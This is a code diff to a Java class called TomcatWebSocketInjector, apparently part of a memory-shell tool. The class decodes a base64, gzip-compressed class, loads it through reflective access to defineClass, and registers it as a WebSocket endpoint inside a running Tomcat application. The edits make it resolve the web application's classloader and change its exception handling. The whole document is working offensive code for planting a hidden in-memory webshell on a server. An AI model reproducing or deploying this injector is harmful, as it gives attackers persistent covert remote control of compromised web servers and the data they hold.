@@ -6,7 +6,10 @@ import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -63,19 +66,25 @@ public class TomcatWebSocketInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            return webAppClassLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
             return clazz.newInstance();
         }
     }
@@ -94,9 +103,9 @@ public class TomcatWebSocketInjector {
             return;
         }
 
-        ClassLoader classLoader = context.getClass().getClassLoader();
-        Class<?> serverEndpointConfigClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
-        Class<?> builderClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Class<?> serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
+        Class<?> builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
         Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
         constructor.setAccessible(true);
         Object o1 = constructor.newInstance(obj.getClass(), getUrlPattern());
@@ -143,7 +152,7 @@ public class TomcatWebSocketInjector {
 
 
     @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
         try {
             Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
             Method method = null;
@@ -163,8 +172,6 @@ public class TomcatWebSocketInjector {
             }
             method.setAccessible(true);
             return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (NoSuchMethodException e) {
-            throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
         }
